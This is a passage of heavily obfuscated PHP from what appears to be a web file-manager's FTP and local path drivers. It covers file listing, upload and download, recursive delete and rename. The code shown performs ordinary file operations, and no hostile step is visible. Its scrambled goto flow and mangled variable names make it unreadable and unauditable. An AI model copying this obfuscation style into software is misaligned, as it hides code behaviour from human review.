$bºä”ŸÎÃƒ); goto C²˜Œ—”òÇ; eÓî‚ñ—Ğˆ: return $C«ß»Û—ä ? $this->getPathOuter($A–ŠÒ¿©Ôì) : !1; goto B¹ÜÀ„»³; C²˜Œ—”òÇ: $f†ÌÒàÜ‹Ç = $this->iconvSystem($f†ÌÒàÜ‹Ç); $fŞÌø·İ‚Ê = $this->iconvSystem($fŞÌø·İ‚Ê); $aŠÌâã¢¶œ = $this->pathFather($fŞÌø·İ‚Ê); goto D©¤³Â³ÁÀ; B¹ÜÀ„»³: } private function folderInfo($e¡²ÃÍŠ»Ü, $Fùİğ³œ†„ = false) { goto E‘ßÕ‰ŒÇ; EŠ‘Ö æ: return $D‘’ÍÛá¦; goto B¤Ù„×Î¯Ÿ; E‘ßÕ‰ŒÇ: $dÇ¤ÙîÔî =& $_SERVER[õëù©û]; $Fî‡ øÀÌ = $this->getPathOuter(rtrim($e¡²ÃÍŠ»Ü, $dÇ¤ÙîÔî[8])); $BÃÜ”ÚÉˆª = $this->pathThis($Fî‡ øÀÌ); goto c½¹­†„Ëï; c½¹­†„Ëï: $c¶ß²ÒÅÃî = $this->iconvSystem($e¡²ÃÍŠ»Ü); if ($Fùİğ³œ†„) { return array($dÇ¤ÙîÔî[28] => $BÃÜ”ÚÉˆª, $dÇ¤ÙîÔî[75] => $Fî‡ øÀÌ, $dÇ¤ÙîÔî[29] => $dÇ¤ÙîÔî[76]); } $D‘’ÍÛá¦ = array($dÇ¤ÙîÔî[28] => $BÃÜ”ÚÉˆª, $dÇ¤ÙîÔî[75] => $Fî‡ øÀÌ, $dÇ¤ÙîÔî[29] => $dÇ¤ÙîÔî[76], $dÇ¤ÙîÔî[183] => 0, $dÇ¤ÙîÔî[106] => 0, $dÇ¤ÙîÔî[1145] => !0, $dÇ¤ÙîÔî[1146] => !0); goto EŠ‘Ö æ; B¤Ù„×Î¯Ÿ: } private function fileInfo($FÒù®ÁÄæÅ, $e«ïœöŠ” = false) { goto Cî¸Ç¢ìï‹; DÂÄ‘’·á: $aŠ¿Ê¥‰‹º = $this->iconvSystem($FÒù®ÁÄæÅ); if ($e«ïœöŠ”) { return array($Aõ­±İ‹Ÿ [28] => $d·¶ÔˆÍö, $Aõ­±İ‹Ÿ [75] => $a»ØÌêˆÉÉ, $Aõ­±İ‹Ÿ [29] => $Aõ­±İ‹Ÿ [163], $Aõ­±İ‹Ÿ [156] => $this->ext($FÒù®ÁÄæÅ), $Aõ­±İ‹Ÿ [77] => $this->size($FÒù®ÁÄæÅ)); } $cˆ­Œİ‚£Û = array($Aõ­±İ‹Ÿ [28] => $d·¶ÔˆÍö, $Aõ­±İ‹Ÿ [75] => $a»ØÌêˆÉÉ, $Aõ­±İ‹Ÿ [29] => $Aõ­±İ‹Ÿ [163], $Aõ­±İ‹Ÿ [183] => 0, $Aõ­±İ‹Ÿ [106] => @ftp_mdtm($this->connect, $aŠ¿Ê¥‰‹º), $Aõ­±İ‹Ÿ [156] => $this->ext($FÒù®ÁÄæÅ), $Aõ­±İ‹Ÿ [77] => $this->size($FÒù®ÁÄæÅ), $Aõ­±İ‹Ÿ [1145] => !0, $Aõ­±İ‹Ÿ [1146] => !0); goto fôî¶§«ó·; fôî¶§«ó·: $cˆ­Œİ‚£Û[$Aõ­±İ‹Ÿ [106]] = $cˆ­Œİ‚£Û[$Aõ­±İ‹Ÿ [106]] > 0 ? $cˆ­Œİ‚£Û[$Aõ­±İ‹Ÿ [106]] : 0; return $cˆ­Œİ‚£Û; goto aíà‹õ‚ã; Cî¸Ç¢ìï‹: $Aõ­±İ‹Ÿ  =& $_SERVER[õëù©û]; $a»ØÌêˆÉÉ = $this->getPathOuter(rtrim($FÒù®ÁÄæÅ, $Aõ­±İ‹Ÿ [8])); $d·¶ÔˆÍö = $this->pathThis($a»ØÌêˆÉÉ); goto DÂÄ‘’·á; aíà‹õ‚ã: } public function size($DÅôÎÏ¶ìğ) { $Cš¶ÊÓ¯°Ó = $this->objectMeta($DÅôÎÏ¶ìğ); return $Cš¶ÊÓ¯°Ó ? $Cš¶ÊÓ¯°Ó[$_SERVER[õëù©û][77]] : 0; } public function info($Cò°˜ĞÖ) { if ($this->isFile($Cò°˜ĞÖ)) { return $this->fileInfo($Cò°˜ĞÖ, 0); } else { if ($this->isFolder($Cò°˜ĞÖ)) { return $this->folderInfo($Cò°˜ĞÖ); } } return !1; } public function exist($eĞ¸†ßğî¹) { return $this->objectMeta($eĞ¸†ßğî¹) ? !0 : !1; } public function isFile($F„ì¸ŠÙ¯¥) { $e¦ÊÕÓõŠ‡ =& $_SERVER[õëù©û]; $fî”›êçÈ = $this->objectMeta($F„ì¸ŠÙ¯¥); return $fî”›êçÈ ? $fî”›êçÈ[$e¦ÊÕÓõŠ‡[29]] == $e¦ÊÕÓõŠ‡[163] : !1; } public function isFolder($fïÍîØƒ») { $C°Î‡´§´¹ =& $_SERVER[õëù©û]; $C¬Ë¸›½Œ = $this->objectMeta($fïÍîØƒ»); return $C¬Ë¸›½Œ ? $C¬Ë¸›½Œ[$C°Î‡´§´¹[29]] == $C°Î‡´§´¹[76] : !1; } public function listPath($aƒŞêÎâÒİ, $B÷Öã¸…¨ = false) { goto cÅ®áĞÄàá; aÕ¶ÇÏ¨ğ : foreach ($eˆšËÁîáõ as $aƒŞêÎâÒİ) { if ($this->isFolder($aƒŞêÎâÒİ)) { $câ¤Å•Õ[$C­—§‘È¶‡[74]][] = $this->folderInfo($aƒŞêÎâÒİ, $B÷Öã¸…¨); } else { $câ¤Å•Õ[$C­—§‘È¶‡[73]][] = $this->fileInfo($aƒŞêÎâÒİ, $B÷Öã¸…¨); } } return $câ¤Å•Õ; goto bËÖÖ‚ô¶; cÅ®áĞÄàá: $C­—§‘È¶‡ =& $_SERVER[õëù©û]; if (!$this->_isconn()) { return !1; } $aƒŞêÎâÒİ = $this->iconvSystem($aƒŞêÎâÒİ); goto AÍï­ò‹õ¹; AÍï­ò‹õ¹: $eˆšËÁîáõ = $this->ftpList($aƒŞêÎâÒİ); $câ¤Å•Õ = array($C­—§‘È¶‡[74] => array(), $C­—§‘È¶‡[73] => array()); if (!$eˆšËÁîáõ) { return $câ¤Å•Õ; } goto aÕ¶ÇÏ¨ğ ; bËÖÖ‚ô¶: } public function has($EÇñˆï“ÜŠ, $CÑïŸ½µÏ = false, $Eòø…§¼İ± = true) { goto eçØÔŞ«¦È; CõäÈ¿››¡: $C›Úäù »„ = $this->ftpList($EÇñˆï“ÜŠ); if (!$C›Úäù »„) { return !1; } if ($CÑïŸ½µÏ) { return array($fÉöÙªƒåÛ[187] => 0, $fÉöÙªƒåÛ[188] => count($C›Úäù »„)); } goto b÷¢óçŸÊÓ; eçØÔŞ«¦È: $fÉöÙªƒåÛ =& $_SERVER[õëù©û]; if (!$this->_isconn()) { return !1; } $EÇñˆï“ÜŠ = $this->iconvSystem($EÇñˆï“ÜŠ); goto CõäÈ¿››¡; b÷¢óçŸÊÓ: foreach ($C›Úäù »„ as $EÇñˆï“ÜŠ) { if ($Eòø…§¼İ±) { if (!$this->isFolder($EÇñˆï“ÜŠ)) { return !0; } } else { if ($this->isFolder($EÇñˆï“ÜŠ)) { return !0; } } } return !1; goto C†»ÜÒ†; C†»ÜÒ†: } public function listAll($Aôó¸Ûƒ˜°) { goto e÷Í ì§±Ú; c›È—Ÿ ‚Í: foreach ($E…Ä¬Ë´ä©[$eÔ˜›ô‘×®[74]] as $BÀˆê¹âå) { $aÑ„Ú¢‘ê›[] = array($eÔ˜›ô‘×®[75] => $eÔ˜›ô‘×®[8] . trim(str_replace($Aôó¸Ûƒ˜°, $eÔ˜›ô‘×®[33], $BÀˆê¹âå), $eÔ˜›ô‘×®[8]) . $eÔ˜›ô‘×®[8], $eÔ˜›ô‘×®[76] => 1, $eÔ˜›ô‘×®[77] => 0); } foreach ($E…Ä¬Ë´ä©[$eÔ˜›ô‘×®[73]] as $CÀøïŠ·ÊÌ) { $aÑ„Ú¢‘ê›[] = array($eÔ˜›ô‘×®[75] => $eÔ˜›ô‘×®[8] . trim(str_replace($Aôó¸Ûƒ˜°, $eÔ˜›ô‘×®[33], $CÀøïŠ·ÊÌ), $eÔ˜›ô‘×®[8]), $eÔ˜›ô‘×®[76] => 0, $eÔ˜›ô‘×®[77] => $this->size($CÀøïŠ·ÊÌ)); } return $aÑ„Ú¢‘ê›; goto f†É„ŒŸ³³; e÷Í ì§±Ú: $eÔ˜›ô‘×® =& $_SERVER[õëù©û]; if (!$this->_isconn()) { return !1; } $Aôó¸Ûƒ˜° = $this->iconvSystem($Aôó¸Ûƒ˜°); goto CïÒ¡ÉîÅ; CïÒ¡ÉîÅ: $E…Ä¬Ë´ä© = array($eÔ˜›ô‘×®[73] => array(), $eÔ˜›ô‘×®[74] => array()); $this->recursionFtpFiles($Aôó¸Ûƒ˜°, $E…Ä¬Ë´ä©); $aÑ„Ú¢‘ê› = array(); goto c›È—Ÿ ‚Í; f†É„ŒŸ³³: } public function getContent($fï®Š•¼Ù´) { if (!$this->_isconn()) { return !1; } $fï®Š•¼Ù´ = $this->iconvSystem($fï®Š•¼Ù´); return $this->fileSubstr($fï®Š•¼Ù´); } public function setContent($C·Ğğ§íä, $D”‚©‰¡’ = '') { goto fˆ±âÇÆÙ©; fˆ±âÇÆÙ©: if (!$this->_isconn()) { return !1; } $eß¢«ĞÖ±“ = $this->pathThis($this->iconvSystem($C·Ğğ§íä)); $F”‡ä·³ê­ = $this->tempFile($eß¢«ĞÖ±“); goto B„Éµ›îÓ; B„Éµ›îÓ: file_put_contents($F”‡ä·³ê­, $D”‚©‰¡’); $AªËŠë›çº = $this->upload($C·Ğğ§íä, $this->iconvApp($F”‡ä·³ê­)); $this->tempFileRemve($F”‡ä·³ê­); goto bŒ“‚à£¦Ô; bŒ“‚à£¦Ô: return $AªËŠë›çº; goto AÇ—Ïê«Æ; AÇ—Ïê«Æ: } public function fileSubstr($D›£Ù¡Ö¨«, $DÍ×Ô—ºŠ = 0, $C¾Ñî÷Ä = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D›£Ù¡Ö¨«, $DÍ×Ô—ºŠ, $C¾Ñî÷Ä); } private function ftpRequest($aÙËæ•²µ, $eøï¤ÕÇ‘ = 0, $B«ˆà†‚¸ = false) { goto EÕ¬†òÃ×Ğ; fÆˆí¡ØÖÀ: curl_setopt($a¶œ†ÜÃê, CURLOPT_URL, $D¤ø±œ°Ó” . $this->pathEncode($aÙËæ•²µ)); curl_setopt($a¶œ†ÜÃê, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($B«ˆà†‚¸) { $a‡õ„³Œ¢ª = $eøï¤ÕÇ‘ + $B«ˆà†‚¸ - 1; curl_setopt($a¶œ†ÜÃê, CURLOPT_RANGE, "{$eøï¤ÕÇ‘}\x2d{$a‡õ„³Œ¢ª}"); } goto Eô„‰†ô²ä; C¢Éª±Ú: return $Aò‚âéÈï; goto dƒ”½Õ­ô‘; EÕ¬†òÃ×Ğ: $aÙËæ•²µ = $this->iconvSystem($aÙËæ•²µ); $D¤ø±œ°Ó” = $this->scheme . $this->host . $_SERVER[õëù©û][4] . $this->port; $a¶œ†ÜÃê = curl_init(); goto fÆˆí¡ØÖÀ; Eô„‰†ô²ä: curl_setopt($a¶œ†ÜÃê, CURLOPT_RETURNTRANSFER, 1); $Aò‚âéÈï = curl_exec($a¶œ†ÜÃê); curl_close($a¶œ†ÜÃê); goto C¢Éª±Ú; dƒ”½Õ­ô‘: } public function upload($dçË°í†ÚÙ, $CºÄå™ÕÂŞ, $bäÙ‹«¿Î  = false, $b¸”‹ƒ´äß = REPEAT_REPLACE) { goto dø›‰‰ÕÏ; A‡ Ê‘×Àì: $CºÄå™ÕÂŞ = $this->iconvSystem($CºÄå™ÕÂŞ); $CÃÉí—ôƒˆ = ftp_nb_put($this->connect, $dçË°í†ÚÙ, $CºÄå™ÕÂŞ, FTP_BINARY); while ($CÃÉí—ôƒˆ == FTP_MOREDATA) { $CÃÉí—ôƒˆ = ftp_nb_continue($this->connect); } goto fÌ˜£Î«‡˜; fÌ˜£Î«‡˜: if ($CÃÉí—ôƒˆ != FTP_FINISHED) { return !1; } return $this->getPathOuter($dçË°í†ÚÙ); goto D©Š’åãÍŠ; dø›‰‰ÕÏ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dçË°í†ÚÙ))) { return !1; } $dçË°í†ÚÙ = $this->iconvSystem($dçË°í†ÚÙ); goto A‡ Ê‘×Àì; D©Š’åãÍŠ: } public function download($c²‡Äëãï, $FåïÙî×¤Ä = '') { goto CŸøØÃˆ©Ê; CŸøØÃˆ©Ê: if (!$this->_isconn()) { return !1; } $e…¸„ÈÖªõ = $this->pathFather($FåïÙî×¤Ä); if (!IO::mkdir($e…¸„ÈÖªõ)) { return !1; } goto Fˆ…»ãåŸÏ; Fˆ…»ãåŸÏ: $c²‡Äëãï = $this->iconvSystem($c²‡Äëãï); $FåïÙî×¤Ä = $this->iconvSystem($FåïÙî×¤Ä); $c¤ë³¬ô¼ë = ftp_nb_get($this->connect, $FåïÙî×¤Ä, $c²‡Äëãï, FTP_BINARY); goto EÊèî¨‚‚”; EÊèî¨‚‚”: while ($c¤ë³¬ô¼ë == FTP_MOREDATA) { $c¤ë³¬ô¼ë = ftp_nb_continue($this->connect); } if ($c¤ë³¬ô¼ë != FTP_FINISHED) { return !1; } return $this->iconvApp($FåïÙî×¤Ä); goto E¼š¨²ÑÕ; E¼š¨²ÑÕ: } private function ftpList($d©ö¨Êµˆ) { goto bÔÉ®‡Å¹—; cÍÓç‡àŞæ: $d©ö¨Êµˆ = rtrim($d©ö¨Êµˆ, $FºèŞ¬§ĞÖ[8]) . $FºèŞ¬§ĞÖ[8]; $b¼·´ÙùãÏ = @ftp_nlist($this->connect, $d©ö¨Êµˆ); if ($b¼·´ÙùãÏ === !1) { $b¼·´ÙùãÏ = @ftp_rawlist($this->connect, $d©ö¨Êµˆ); foreach ($b¼·´ÙùãÏ as $d£é¸Úö½— => $cŠŒ‹ºˆ‚ã) { $b¼·´ÙùãÏ[$d£é¸Úö½—] = end(explode($FºèŞ¬§ĞÖ[1147], $cŠŒ‹ºˆ‚ã)); } } goto FÛ˜¯ğˆä; FÛ˜¯ğˆä: $EÆ®¿Ÿß¡ã = array(); foreach ($b¼·´ÙùãÏ as $Bíäâî—ôà) { if ($Bíäâî—ôà == $FºèŞ¬§ĞÖ[91] || $Bíäâî—ôà == $FºèŞ¬§ĞÖ[1148]) { continue; } if (!strstr($Bíäâî—ôà, $FºèŞ¬§ĞÖ[8])) { $Bíäâî—ôà = $d©ö¨Êµˆ . ltrim($Bíäâî—ôà, $FºèŞ¬§ĞÖ[8]); } $EÆ®¿Ÿß¡ã[] = $this->iconvApp($Bíäâî—ôà); } return $EÆ®¿Ÿß¡ã; goto DÛøÊæ³Óã; bÔÉ®‡Å¹—: $FºèŞ¬§ĞÖ =& $_SERVER[õëù©û]; if (!$this->isFolder($d©ö¨Êµˆ)) { return !1; } @ftp_chdir($this->connect, $FºèŞ¬§ĞÖ[8]); goto cÍÓç‡àŞæ; DÛøÊæ³Óã: } private function recursionFtpFiles($aì²¿ø¦Á¹, &$E‹ŸŒª¼») { $A¼¾Âô”Ì =& $_SERVER[õëù©û]; if (!$this->_isconn()) { return !1; } if (!($cÜóç¸µˆ = $this->ftpList($aì²¿ø¦Á¹))) { return !1; } foreach ($cÜóç¸µˆ as $aì²¿ø¦Á¹) { if ($this->isFolder($aì²¿ø¦Á¹)) { $this->recursionFtpFiles($aì²¿ø¦Á¹, $E‹ŸŒª¼»); $E‹ŸŒª¼»[$A¼¾Âô”Ì[74]][] = $aì²¿ø¦Á¹; } else { $E‹ŸŒª¼»[$A¼¾Âô”Ì[73]][] = $aì²¿ø¦Á¹; } } } private function objectMeta($B‹ÌÂ¿ˆÍì) { goto EÔ»œ…·ß¬; cµ ‡Š˜ç: $D‘êÙÔµÜ‚ = @ftp_size($this->connect, $this->iconvSystem($B‹ÌÂ¿ˆÍì)); if ($D‘êÙÔµÜ‚ != -1) { $a£òÌ‚¡ø– = array($A•ÜİˆÎ¯ñ[77] => $D‘êÙÔµÜ‚, $A•ÜİˆÎ¯ñ[29] => $A•ÜİˆÎ¯ñ[163]); } else { $f¢ÖÂñ°œ = @ftp_chdir($this->connect, $this->iconvSystem($B‹ÌÂ¿ˆÍì)); $a£òÌ‚¡ø– = $f¢ÖÂñ°œ ? array($A•ÜİˆÎ¯ñ[77] => 0, $A•ÜİˆÎ¯ñ[29] => $A•ÜİˆÎ¯ñ[76]) : !1; } Cache::set($cÈï–ÒÌˆ£, $a£òÌ‚¡ø–, 0); goto D…Ì¬Ä¶; D…Ì¬Ä¶: return $a£òÌ‚¡ø–; goto e•×Æ¥ãöÉ; BÃ÷¿µ»¦Æ: if ($a£òÌ‚¡ø– !== null && $a£òÌ‚¡ø– !== !1) { return $a£òÌ‚¡ø–; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $A•ÜİˆÎ¯ñ[8]); goto cµ ‡Š˜ç; EÔ»œ…·ß¬: $A•ÜİˆÎ¯ñ =& $_SERVER[õëù©û]; $cÈï–ÒÌˆ£ = $A•ÜİˆÎ¯ñ[1149] . md5($B‹ÌÂ¿ˆÍì); $a£òÌ‚¡ø– = Cache::get($cÈï–ÒÌˆ£); goto BÃ÷¿µ»¦Æ; e•×Æ¥ãöÉ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($CĞÀ¢Ä’›î) { if (substr($CĞÀ¢Ä’›î, 0, 2) == $_SERVER[õëù©û][1138]) { $CĞÀ¢Ä’›î = BASIC_PATH . substr($CĞÀ¢Ä’›î, 2); } return $CĞÀ¢Ä’›î; } public function iconvApp($b‚¿åŠ¹‰¸) { $C©®ïÁÎÁ‹ =& $_SERVER[õëù©û]; global $config; return $this->iconvTo($b‚¿åŠ¹‰¸, $config[$C©®ïÁÎÁ‹[1136]], $config[$C©®ïÁÎÁ‹[1135]]); } public function iconvSystem($f‹´‹½õÖš) { $a¿ÀÂ§˜êª =& $_SERVER[õëù©û]; global $config; return $this->iconvTo($f‹´‹½õÖš, $config[$a¿ÀÂ§˜êª[1135]], $config[$a¿ÀÂ§˜êª[1136]]); } public function getPathOuter($Cã¾âÑ¿ƒù) { goto f·‹£µ¦Ü†; f·‹£µ¦Ü†: $aùÚ´Ÿ«Ïõ =& $_SERVER[õëù©û]; $aä±¾­ãÙì = $this->iconvApp($this->pathBase); $Cã¾âÑ¿ƒù = $this->iconvApp($Cã¾âÑ¿ƒù); goto cÉÎ¡ÁÓ¿Ò; cÉÎ¡ÁÓ¿Ò: if (substr($aä±¾­ãÙì, 0, 2) == $aùÚ´Ÿ«Ïõ[1138]) { $aä±¾­ãÙì = BASIC_PATH . substr($aä±¾­ãÙì, 2); } if (substr($Cã¾âÑ¿ƒù, 0, 2) == $aùÚ´Ÿ«Ïõ[1138]) { $Cã¾âÑ¿ƒù = BASIC_PATH . substr($Cã¾âÑ¿ƒù, 2); } $aä±¾­ãÙì = KodIO::clear($aä±¾­ãÙì); goto fïÀñî³Ş›; fïÀñî³Ş›: $Cã¾âÑ¿ƒù = KodIO::clear($Cã¾âÑ¿ƒù); $Cã¾âÑ¿ƒù = substr($Cã¾âÑ¿ƒù, strlen($aä±¾­ãÙì)); if (empty($this->pathDriver)) { return $Cã¾âÑ¿ƒù; } goto f®¼˜ÍïÂ; f®¼˜ÍïÂ: return $this->pathDriver . $aùÚ´Ÿ«Ïõ[8] . ltrim($Cã¾âÑ¿ƒù, $aùÚ´Ÿ«Ïõ[8]); goto b•ªÆ¬Ø‚¶; b•ªÆ¬Ø‚¶: } public function mkfile($BÃßùË¶ö˜, $fâ˜ó¶âØÆ = '', $c„Ö›¾œĞ = REPEAT_RENAME) { $BÃßùË¶ö˜ = $this->iconvSystem($BÃßùË¶ö˜); @touch($BÃßùË¶ö˜); if ($fâ˜ó¶âØÆ) { file_put_contents($BÃßùË¶ö˜, $fâ˜ó¶âØÆ); } return is_file($BÃßùË¶ö˜) ? $this->getPathOuter($BÃßùË¶ö˜) : !1; } public function mkdir($fŸî¹‡”íğ, $då£ƒÔÀ¡½ = REPEAT_SKIP) { $fŸî¹‡”íğ = $this->iconvSystem($fŸî¹‡”íğ); if (is_dir($fŸî¹‡”íğ)) { return $this->getPathOuter($fŸî¹‡”íğ); } @mkdir($fŸî¹‡”íğ, 511, !0); return is_dir($fŸî¹‡”íğ) ? $this->getPathOuter($fŸî¹‡”íğ) : !1; } public function copyFile($aÅÖİĞÌ…, $A»ˆéç•İ­) { $this->mkdir($this->pathFather($A»ˆéç•İ­)); $aÅÖİĞÌ… = $this->iconvSystem($aÅÖİĞÌ…); $A»ˆéç•İ­ = $this->iconvSystem($A»ˆéç•İ­); $bœõœ’˜Ğ¤ = @copy($aÅÖİĞÌ…, $A»ˆéç•İ­); return $bœõœ’˜Ğ¤ ? $this->getPathOuter($A»ˆéç•İ­) : !1; } public function moveFile($d¢ğ†·“áã, $fÌÃá”©) { $this->mkdir($this->pathFather($fÌÃá”©)); $d¢ğ†·“áã = $this->iconvSystem($d¢ğ†·“áã); $fÌÃá”© = $this->iconvSystem($fÌÃá”©); $FºÂ¬óá… = intval(@rename($d¢ğ†·“áã, $fÌÃá”©)); if (!$FºÂ¬óá…) { if ($FºÂ¬óá… = intval(@copy($d¢ğ†·“áã, $fÌÃá”©))) { @unlink($d¢ğ†·“áã); } } return $FºÂ¬óá… ? $this->getPathOuter($fÌÃá”©) : !1; } public function delFile($A¶ÒğÖêÀ£) { $A¶ÒğÖêÀ£ = $this->iconvSystem($A¶ÒğÖêÀ£); if (!@unlink($A¶ÒğÖêÀ£)) { @chmod($A¶ÒğÖêÀ£, 511); if (!@unlink($A¶ÒğÖêÀ£)) { return !1; } } else { return !0; } } public function delFolder($fĞğ…§ËìÄ) { goto EÜŸ¬«õ®á; a®Ç‘ñÉÖ: if (!($e“¼ğôİí = opendir($fĞğ…§ËìÄ))) { return !1; } while (($F¯íˆª À = readdir($e“¼ğôİí)) !== !1) { if ($F¯íˆª À == $aœ¨·ïØæ[91] || $F¯íˆª À == $aœ¨·ïØæ[1148]) { continue; } $e¬¶‘îëã• = $fĞğ…§ËìÄ . $aœ¨·ïØæ[8] . $F¯íˆª À; if (!is_dir($e¬¶‘îëã•)) { if (!unlink($e¬¶‘îëã•)) { chmod($e¬¶‘îëã•, 511); if (!unlink($e¬¶‘îëã•)) { return !1; } } } else { chmod($e¬¶‘îëã•, 511); $e¬¶‘îëã• = $this->iconvApp($e¬¶‘îëã•); if (!$this->delFolder($e¬¶‘îëã•)) { return !1; } } } closedir($e“¼ğôİí); goto dÊî‘º‰–; EÜŸ¬«õ®á: $aœ¨·ïØæ =& $_SERVER[õëù©û]; $fĞğ…§ËìÄ = $this->iconvSystem($fĞğ…§ËìÄ); if (!is_dir($fĞğ…§ËìÄ)) { return !0; } goto a®Ç‘ñÉÖ; dÊî‘º‰–: return rmdir($fĞğ…§ËìÄ); goto BÉ¸ó±·î; BÉ¸ó±·î: } public function rename($A–ã²ÄÌåê, $CŠ„•ƒŠ) { goto a‹¾ä‘¢Ö; A¾áâˆ»: $D¢·§˜¤·Ã = @rename($A–ã²ÄÌåê, $b¶Š©ÄŒ«Ú); $b¶Š©ÄŒ«Ú = $this->iconvApp($b¶Š©ÄŒ«Ú); return $D¢·§˜¤·Ã ? $this->getPathOuter($b¶Š©ÄŒ«Ú) : !1; goto EÕ–Ãßê£ã; fÍ¬æ—ƒª: $A–ã²ÄÌåê = $this->iconvSystem($A–ã²ÄÌåê); $c‹ñ°„¢Áõ = $this->pathFather($A–ã²ÄÌåê); $b¶Š©ÄŒ«Ú = rtrim($c‹ñ°„¢Áõ, $A›”­–Ó²®[8]) . $A›”­–Ó²®[8] . $FÀŠ×“Ü£¤; goto A¾áâˆ»; a‹¾ä‘¢Ö: $A›”­–Ó²® =& $_SERVER[õëù©û]; $FÀŠ×“Ü£¤ = $this->fileNameAuto($this->pathFather($A–ã²ÄÌåê), $CŠ„•ƒŠ); $FÀŠ×“Ü£¤ = $this->iconvSystem($FÀŠ×“Ü£¤); goto fÍ¬æ—ƒª; EÕ–Ãßê£ã: } public function size($fÍŞëàÊ™¤) { $fÍŞëàÊ™¤ = $this->iconvSystem($fÍŞëàÊ™¤); return (double) abs(sprintf($_SERVER[õëù©û][1150], @filesize($fÍŞëàÊ™¤))); } public function info($Fõ–Ù…ËÀ¿) { $Fõ–Ù…ËÀ¿ = $this->iconvSystem($Fõ–Ù…ËÀ¿); if ($this->isFolder($Fõ–Ù…ËÀ¿)) { return $this->folderInfo($Fõ–Ù…ËÀ¿); } else { if ($this->isFile($Fõ–Ù…ËÀ¿)) { return $this->fileInfo($Fõ–Ù…ËÀ¿); } } return !1; } protected function infoChildren($C‡Œ„ŞŠğä, &$e–âå±éé, $Có„ÈÓØî² = true) { $B²Á–áÚ™¦ =& $_SERVER[õëù©û]; $C‡Œ„ŞŠğä = rtrim($C‡Œ„ŞŠğä, $B²Á–áÚ™¦[8]) . $B²Á–áÚ™¦[8]; if ($Có„ÈÓØî²) { check_abort(); $C‡Œ„ŞŠğä = $this->iconvSystem($C‡Œ„ŞŠğä); } if (!($dƒ÷ÅÆ = @opendir($C‡Œ„ŞŠğä))) { return; } while (($bìùÆ´¶ŸÔ = readdir($dƒ÷ÅÆ)) !== !1) { if ($bìùÆ´¶ŸÔ == $B²Á–áÚ™¦[91] || $bìùÆ´¶ŸÔ == $B²Á–áÚ™¦[1148]) { continue; } $b”›Ç¦²å = $C‡Œ„ŞŠğä . $bìùÆ´¶ŸÔ; if (is_file($b”›Ç¦²å)) { $e–âå±éé[$B²Á–áÚ™¦[78]]++; $e–âå±éé[$B²Á–áÚ™¦[77]] += (double) abs(sprintf($B²Á–áÚ™¦[1150], @filesize($b”›Ç¦²å))); } else { $e–âå±éé[$B²Á–áÚ™¦[79]]++; $this->infoChildren($b”›Ç¦²å, $e–âå±éé, !1); } } closedir($dƒ÷ÅÆ); } private function folderInfo($Cì‡ÌÅ§Äê, $EÉ‰Ä¯×ˆ = false) { $b»‰ĞÂ¨áñ =& $_SERVER[õëù©û]; $Cì‡ÌÅ§Äê = rtrim($Cì‡ÌÅ§Äê, $b»‰ĞÂ¨áñ[8]) . $b»‰ĞÂ¨áñ[8]; $BŠ°ÜÆÊˆ = $this->iconvApp($this->pathThis($Cì‡ÌÅ§Äê)); if ($EÉ‰Ä¯×ˆ) { return array($b»‰ĞÂ¨áñ[28] => $BŠ°ÜÆÊˆ, $b»‰ĞÂ¨áñ[75] => $this->getPathOuter($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[29] => $b»‰ĞÂ¨áñ[76]); } $bù¬”­Ò½‘ = array($b»‰ĞÂ¨áñ[28] => $BŠ°ÜÆÊˆ, $b»‰ĞÂ¨áñ[75] => $this->getPathOuter($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[29] => $b»‰ĞÂ¨áñ[76], $b»‰ĞÂ¨áñ[183] => @filectime($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[106] => @filemtime($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[1151] => @fileatime($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[1145] => is_readable($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[1146] => is_writable($Cì‡ÌÅ§Äê), $b»‰ĞÂ¨áñ[1152] => get_mode($Cì‡ÌÅ§Äê)); return $bù¬”­Ò½‘; } private function fileInfo($DùÕ›«ë³‰, $eéøé¢À ® = false) { $E…’ÙË‹Ü• =& $_SERVER[õëù©û]; $fÃæ—É–®™ = $this->iconvApp($this->pathThis($DùÕ›«ë³‰)); if ($eéøé¢À ®) { return array($E…’ÙË‹Ü•[28] => $fÃæ—É–®™, $E…’ÙË‹Ü•[75] => $this->getPathOuter($DùÕ›«ë³‰), $E…’ÙË‹Ü•[29] => $E…’ÙË‹Ü•[163], $E…’ÙË‹Ü•[77] => $this->size($DùÕ›«ë³‰), $E…’ÙË‹Ü•[156] => $this->ext($fÃæ—É–®™)); } $cŒôÏ‘’† = array($E…’ÙË‹Ü•[28] => $fÃæ—É–®™, $E…’ÙË‹Ü•[75] => $this->getPathOuter($DùÕ›«ë³‰), $E…’ÙË‹Ü•[29] => $E…’ÙË‹Ü•[163], $E…’ÙË‹Ü•[183] => @filectime($DùÕ›«ë³‰), $E…’ÙË‹Ü•[106] => @filemtime($DùÕ›«ë³‰), $E…’ÙË‹Ü•[1151] => @fileatime($DùÕ›«ë³‰), $E…’ÙË‹Ü•[77] => $this->size($DùÕ›«ë³‰), $E…’ÙË‹Ü•[156] => $this->ext($fÃæ—É–®™), $E…’ÙË‹Ü•[1145] => is_readable($DùÕ›«ë³‰), $E…’ÙË‹Ü•[1146] => is_writable($DùÕ›«ë³‰), $E…’ÙË‹Ü•[1152] => get_mode($DùÕ›«ë³‰)); return $cŒôÏ‘’†; } public function exist($D£Ç¥¹Ú¥Í) { $D£Ç¥¹Ú¥Í = $this->iconvSystem($D£Ç¥¹Ú¥Í); return @file_exists($D£Ç¥¹Ú¥Í); } public function isFile($cÊ´‰ò¤µÊ) { $cÊ´‰ò¤µÊ = $this->iconvSystem($cÊ´‰ò¤µÊ); return @is_file($cÊ´‰ò¤µÊ); } public function isFolder($FÎåæå‹Í…) { $FÎåæå‹Í… = $this->iconvSystem($FÎåæå‹Í…); return @is_dir($FÎåæå‹Í…); } public function listPath($fñÁ†´ğ©, $bçÊç¤Ò·ò = false) { goto fÀˆ‡¿¹Ü; fÀˆ‡¿¹Ü: 